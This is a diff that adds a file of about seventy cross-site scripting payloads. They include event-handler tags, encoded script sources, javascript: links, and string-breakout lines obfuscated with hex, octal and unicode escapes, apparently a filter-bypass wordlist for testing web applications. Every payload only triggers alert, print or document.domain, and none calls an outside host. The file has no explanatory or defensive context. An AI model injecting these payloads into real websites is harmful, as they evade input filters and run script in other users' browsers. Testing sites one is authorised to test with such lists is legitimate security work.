@@ -1,0 +1,70 @@
+Info
+<script id=x tabindex=1 onactivate=alert(1)></script>
+<script id=x tabindex=1 onbeforedeactivate=print()></script><input autofocus>
+<script id=x tabindex=1 onfocus=alert(1)></script>
+"<script onclick=""alert(1)"">test</script>"
+<img srcset=1 onerror=alert(1)>
+<script onerror=alert(1) src=/></script>
+<audio src/onerror=alert(1)>
+<body onerror=alert(1) onload=/>
+<embed src=1 onerror=alert(1) type=image/gif>
+<image src/onerror=alert(1)>
+<image srcset=1 onerror=alert(1)>
+<img src/onerror=alert(1)>
+<img srcset=1 onerror=alert(1)>
+<input type=image src=1 onerror=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<link rel=stylesheet href=1 onerror=alert(1)>
+<object onerror=alert(1) data=1 type=image/gif>
+<script onerror=alert(1) src=/></script>
+<svg><image href=1 onerror=alert(1)>
+<video src/onerror=alert(1)>
+<video><source onerror=alert(1) src=1></video>
+"<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>"
+"<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>"
+"<iframe src=""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""></iframe>"
+<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
+<script>\u0061lert(1)</script>
+<script>\u{0000000061}lert(1)</script>
+"<a href=""&#106;avascript:alert(1)"">XSS</a><a href=""&#106avascript:alert(1)"">XSS</a>"
+"<a href=""&#x6a;avascript:alert(1)"">XSS</a>"
+"<a href=""javascript:x='%27-alert(1)-%27';"">XSS</a>"
+';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
+';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
+';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
+';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
+';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//
+';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//
+';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//
+';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+"';self['\x65\x76\x61\x6c']('self[""\x61\x6c\x65\x72\x74""](self[""\x61\x74\x6f\x62""](""WFNT""))');//"
+"';top['\x65\x76\x61\x6c']('top[""\x61\x6c\x65\x72\x74""](top[""\x61\x74\x6f\x62""](""WFNT""))');//"
+"';frames['\x65\x76\x61\x6c']('frames[""\x61\x6c\x65\x72\x74""](frames[""\x61\x74\x6f\x62""](""WFNT""))');//"
+';window['\141\154\145\162\164']('\130\123\123');//
+';this['\141\154\145\162\164']('\130\123\123');//
+';parent['\141\154\145\162\164']('\130\123\123');//
+';globalThis['\141\154\145\162\164']('\130\123\123');//
+';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+';self[/al/.source+/ert/.source](/XSS/.source);//
+';top[/al/.source+/ert/.source](/XSS/.source);//
+';frames[/al/.source+/ert/.source](/XSS/.source);//
+<input type=image onloadstart=alert(1) src=validimage.png>
+<input type=image src=1 onerror=alert(1)>
+"<isindex onmouseup=""alert(1)"">test</isindex>"
+<isindex onmousewheel=alert(1)>requires scrolling
+"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>"
+<listing id=x tabindex=1 onfocus=alert(1)></listing>
+<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>
+"<style>@keyframes slidein {}</style><multicol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></multicol>"
+<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>
+"<style>:target {color:red;}</style><rtc id=x style=""transition:color 1s"" ontransitionend=alert(1)></rtc>"
+"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationend=""alert(1)""></section>"
+"<object onkeydown=""alert(1)"" contenteditable>test</object>"
+"<object onkeypress=""alert(1)"" contenteditable>test</object>"
